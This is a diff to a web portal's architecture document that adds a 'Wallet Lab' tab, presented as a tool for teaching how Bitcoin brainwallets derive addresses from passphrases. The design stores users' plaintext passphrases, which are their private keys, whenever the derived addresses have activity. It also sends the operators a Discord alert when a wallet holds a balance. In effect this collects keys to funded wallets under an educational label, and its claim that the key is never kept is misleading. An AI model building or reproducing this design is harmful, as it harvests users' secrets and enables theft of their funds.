@@ -1,8 +1,8 @@
 # QL_Portal_Architecture — QuantumBTC Onboarding Portal
 
 > **ID:** QL_Portal_Architecture
-> **Version:** 1.1
-> **Last Updated:** 2026-04-09
+> **Version:** 1.2
+> **Last Updated:** 2026-04-10
 > **Status:** APPROVED
 
 ## 1. Overview
@@ -50,7 +50,7 @@ onboarding-portal/
 
 ## 4. Tab Architecture
 
-The page is a **5-tab SPA** driven by React `useState` in `page.tsx`. `'use client'` is required.
+The page is a **6-tab SPA** driven by React `useState` in `page.tsx`. `'use client'` is required.
 
 | Tab ID | Label | Primary Component |
 | :--- | :--- | :--- |
@@ -59,6 +59,7 @@ The page is a **5-tab SPA** driven by React `useState` in `page.tsx`. `'use clie
 | `wallets` | Wallets | `WalletTierList` |
 | `quantumshield` | QuantumShield | `QuantumShielding` |
 | `faq` | FAQ | `FAQ` |
+| `walletlab` | Wallet Lab | `WalletLab` |
 
 ## 4.1 Responsive Navigation (`TabNav`)
 
@@ -89,7 +90,57 @@ The page is a **5-tab SPA** driven by React `useState` in `page.tsx`. `'use clie
 - Canonical URL: `https://learn.quantumbtc.dev`.
 - See `QL_SEO_Strategy.md` for full SEO documentation.
 
-## 7. Deployment
+## 7. Wallet Lab Tab (Tab 6)
+
+### 7.1 Overview
+
+The **Wallet Lab** is a cryptography education tool that demonstrates how Bitcoin addresses are derived from an arbitrary passphrase using `SHA-256(phrase)` as the private key. This method is **inherently insecure** and the UI displays a prominent, non-dismissible security warning.
+
+### 7.2 Architecture
+
+| Concern | Where it runs | Notes |
+| :--- | :--- | :--- |
+| Key derivation (ECDSA) | **Server** (`/api/wallet-lab/derive`) | Private key never returned to browser |
+| mempool.space queries | **Browser** | Each user consumes their own API quota |
+| Phrase storage (Supabase) | **Server** (`/api/wallet-lab/record`) | Only called when TX activity detected |
+| Discord alert | **Server** (`/api/wallet-lab/record`) | Fires when `balance_btc > 0` |
+
+### 7.3 API Routes
+
+#### `POST /api/wallet-lab/derive`
+- **Runtime:** Node.js
+- **Input:** `{ phrase: string }`
+- **Output:** `{ pubkey_hex, p2pk_scripthash, legacy_uncomp, legacy_comp, p2sh, bech32 }`
+- **Libraries:** `@noble/secp256k1`, `@noble/hashes`, `@scure/base`
+- **Security:** Private key is computed and discarded server-side. It is **never** logged or returned.
+
+#### `POST /api/wallet-lab/record`
+- **Runtime:** Node.js
+- **Input:** `{ phrase, phrase_hash, addresses, tx_count, total_received_btc, balance_btc }`
+- **Logic:** Upserts row in `wallet_lab_phrases` (deduped by `phrase_hash`). Sends Discord alert if `balance_btc > 0`.
+- **Auth:** No user auth. Service role key used server-side only.
+
+### 7.4 Supabase Table — `wallet_lab_phrases`
+
+| Column | Type | Purpose |
+| :--- | :--- | :--- |
+| `phrase_hash` | TEXT UNIQUE | SHA-256(phrase) — dedup key |
+| `phrase` | TEXT | Actual phrase (educational context) |
+| `addresses` | JSONB | All 5 derived address types |
+| `tx_count` | INTEGER | Total TXs found |
+| `total_received_btc` | NUMERIC(20,8) | Lifetime received |
+| `balance_btc` | NUMERIC(20,8) | Current balance (triggers alert) |
+| `alert_sent` | BOOLEAN | Prevents duplicate alerts |
+
+### 7.5 Required Environment Variables (Vercel)
+
+| Variable | Description |
+| :--- | :--- |
+| `SUPABASE_URL` | `https://pwmjzqgfkgrzfqbsxube.supabase.co` |
+| `SUPABASE_SERVICE_ROLE_KEY` | From Supabase Dashboard → Settings → API |
+| `ADMIN_ALERT_WEBHOOK` | Discord Webhook URL (same as backend Ruleta project) |
+
+## 8. Deployment
 
 - Git repository: `onboarding-portal/` subfolder within `quantum-btc-marketing/`.
 - Deployments are triggered by git push to `main` branch.
